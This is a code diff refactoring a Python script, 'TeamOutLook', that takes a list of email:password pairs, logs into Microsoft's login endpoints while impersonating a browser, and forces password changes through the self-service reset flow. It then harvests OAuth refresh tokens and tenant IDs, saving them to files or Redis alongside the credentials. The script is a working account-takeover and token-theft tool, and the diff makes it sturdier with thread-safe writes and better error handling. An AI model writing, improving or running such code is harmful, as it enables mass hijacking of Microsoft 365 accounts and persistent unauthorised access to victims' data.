@@ -1,17 +1,17 @@
-import requests
+import argparse
 import json
-import re
-import time
-import requests
-from curl_cffi import requests
 import logging
-import threading
-import queue
-import time
-import signal
-import sys
 import os
+import queue
+import re
+import sys
+import threading
+import time
+from datetime import datetime
+from typing import Optional
+
 from colorama import Fore, Style
+from curl_cffi import requests
 
 """@jonnyssk"""
 logging.basicConfig(
@@ -20,25 +20,29 @@ logging.basicConfig(
     datefmt="%Y-%m-%d %H:%M:%S"
 )
 logger = logging.getLogger(__name__)
-from datetime import datetime
-import platform, uuid, hashlib
 
 FOLDERCRETE = ''
 
+_write_lock = threading.Lock()
+
+
+def safe_write(path: str, line: str) -> None:
+    with _write_lock:
+        with open(path, 'a', encoding='utf-8') as fh:
+            fh.write(line)
+
+
 def create_timestamped_folder(base_name="result"):
-    # Lấy thời gian hiện tại
     now = datetime.now()
-    # Định dạng theo dd-mm-yy_hh-mm-ss
     folder_name = f"{base_name}_{now.strftime('%d-%m-%y_%H-%M-%S')}"
-    # Tạo thư mục
     os.makedirs(folder_name, exist_ok=True)
-    print(f"📁 Folder created: {folder_name}")
+    logger.info(f"Folder created: {folder_name}")
     return folder_name
 
 def print_red_centered_art():
-    os.system("clear")
+    print("\033[2J\033[H", end="")
 
-    art = '''
+    art = r'''
 
         _______                         _______    _
     |__   __|                       |__   __|  | |
@@ -50,13 +54,13 @@ def print_red_centered_art():
 
     '''
     red_art = f"{Fore.RED}{art}{Style.RESET_ALL}"  # Set the text color to red
-    print(red_art.center(200))  # Adjust the width (80 characters) to match your terminal size
+    logger.info(red_art.center(200))  # Adjust the width (80 characters) to match your terminal size
 
 
 
 class TeamOutLook:
 
-    def __init__(self, account: str, proxy: str = None, redis_client=None):
+    def __init__(self, account: str, proxy: Optional[str] = None, redis_client: Optional['TokenRedis'] = None) -> None:
         self.mail, self.pwd = account.split(":")
         self.newpwd = self.pwd + "1"
         self.session = requests.Session(impersonate="firefox135",timeout=60)
@@ -86,7 +90,7 @@ class TeamOutLook:
 
 
 
-    def authorize_common(self):
+    def authorize_common(self) -> 'str | bool':
 
         try:
 
@@ -131,13 +135,13 @@ class TeamOutLook:
             logger.info(f'{self.mail}     ------      Error Authorize {str(e)}')
             return False
 
-    def login_common(self,response):
+    def login_common(self, response: str) -> 'str | bool':
         try:
             sFT = re.findall(r'"sFT":"(.*?)"',response)[0]
             sCtx = re.findall(r'"sCtx":"(.*?)"',response)[0]
             canary = bytes(re.findall(r'"canary":"(.*?)"',response)[0],'utf-8').decode('unicode-escape')
-        except:
-            logger.info(f'{self.mail}     ------      Not Found Params In Login Common')
+        except (IndexError, KeyError) as exc:
+            logger.warning(f'{self.mail} -- missing param: {exc}')
             return False
 
         headers = {
@@ -194,7 +198,12 @@ class TeamOutLook:
 
         response = self.session.post('https://login.microsoftonline.com/common/login?sso_reload=true',  headers=headers, data=data, allow_redirects=False)
 
-        self.tenant_id = re.findall(r'tenant=(.*?)"',response.headers.get('reporting-endpoints'))[0]
+        reporting = response.headers.get('reporting-endpoints', '')
+        matches = re.findall(r'tenant=(.*?)"', reporting)
+        if not matches:
+            logger.warning(f'{self.mail} -- tenant not found in response')
+            return False
+        self.tenant_id = matches[0]
 
         return response.text
 
@@ -205,8 +214,8 @@ class TeamOutLook:
             sFT = re.findall(r'"sFT":"(.*?)"',response)[0]
             sCtx = re.findall(r'"sCtx":"(.*?)"',response)[0]
             canary = bytes(re.findall(r'"canary":"(.*?)"',response)[0],'utf-8').decode('unicode-escape')
-        except:
-            logger.info(f'{self.mail}     ------      Not Found Params In Converger Change Password')
+        except (IndexError, KeyError) as exc:
+            logger.warning(f'{self.mail} -- missing param: {exc}')
             return False
 
         try:
@@ -315,7 +324,7 @@ class TeamOutLook:
             response = self.session.post('https://login.microsoftonline.com/common/SSPR/End', headers=headers, data=data)
 
             self.pwd = self.newpwd
-            open(f'{FOLDERCRETE}/password_changed.txt', 'a', encoding='utf-8').write(f'{self.mail}|{self.pwd}\n')
+            safe_write(f'{FOLDERCRETE}/password_changed.txt', f'{self.mail}|{self.pwd}\n')
             logger.info(f'{self.mail}     ------      Password Changed')
             time.sleep(5)
 
@@ -338,9 +347,9 @@ class TeamOutLook:
             sFT = re.findall(r'"sFT":"(.*?)"',response)[0]
             sCtx = re.findall(r'"sCtx":"(.*?)"',response)[0]
             canary = bytes(re.findall(r'"canary":"(.*?)"',response)[0],'utf-8').decode('unicode-escape')
-        except:
-            logger.info(f'{self.mail}     ------      Not Found Params In Login KMSI')
-            print(response)
+        except (IndexError, KeyError) as exc:
+            logger.warning(f'{self.mail} -- missing param: {exc}')
+            logger.info(response)
             return False
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -377,8 +386,8 @@ class TeamOutLook:
         try:
             data = json.loads(re.findall(r'"oPostParams":(.*?),"iMaxStackForKnockoutAsyncComponents"',response.text)[0])
             urlPost = re.findall(r'"urlPost":"(.*?)"',response.text)[0].replace('\\u0026',"&")
-        except:
-            logger.info(f'{self.mail}     ------      Not Found Params In Post KMSI')
+        except (IndexError, KeyError) as exc:
+            logger.warning(f'{self.mail} -- missing param: {exc}')
             return False
 
         response = self.session.post('https://login.microsoftonline.com' + urlPost, headers=headers, data=data,allow_redirects=False)
@@ -387,8 +396,8 @@ class TeamOutLook:
             return False
         try:
             code = re.findall(r'code=(.*?)&',response.headers.get('location'))[0]
-        except:
-            logger.info(f'{self.mail}     ------      ERROR found code')
+        except (IndexError, KeyError) as exc:
+            logger.warning(f'{self.mail} -- missing param: {exc}')
             return False
 
         return code
@@ -444,17 +453,15 @@ class TeamOutLook:
             logger.info(f'{self.mail}     ------      ERROR not found access_token')
             return False
 
-        accesstoken = response.json()['access_token']
-
         if self.redis_client:
             self.redis_client.push_token(self.mail, self.pwd, rf, self.tenant_id)
         else:
-            open(f'{FOLDERCRETE}/get_token_success.txt', 'a', encoding='utf-8').write(
-                f'{self.mail}:{self.pwd}|{rf}|{self.tenant_id}\n')
+            safe_write(f'{FOLDERCRETE}/get_token_success.txt',
+                       f'{self.mail}:{self.pwd}|{rf}|{self.tenant_id}\n')
         logger.info(f'{self.mail}     ------      Get token success - Tenant: {self.tenant_id}')
         return True
 
-    def DoTask(self):
+    def DoTask(self) -> bool:
         try:
             res__authorize_common = self.authorize_common()
 
@@ -489,8 +496,6 @@ class TeamOutLook:
             return False
 
 
-import argparse
-
 def main():
     global FOLDERCRETE
 
@@ -511,7 +516,8 @@ def main():
         host, port = args.redis.split(':')
         redis_client = TokenRedis(host=host, port=int(port))
 
-    listmail = open(args.accounts, 'r', encoding='utf-8').read().splitlines()
+    with open(args.accounts, 'r', encoding='utf-8') as f:
+        listmail = f.read().splitlines()
 
     if redis_client and args.tenant:
         listmail = redis_client.get_accounts_to_login(args.tenant, listmail)
@@ -544,7 +550,7 @@ def main():
                     with lock:
                         hits += 1
                 else:
-                    open(f'{FOLDERCRETE}/failed_get.txt', 'a', encoding='utf-8').write(f'{mail}\n')
+                    safe_write(f'{FOLDERCRETE}/failed_get.txt', f'{mail}\n')
                     with lock:
                         fails += 1
             except Exception as e:
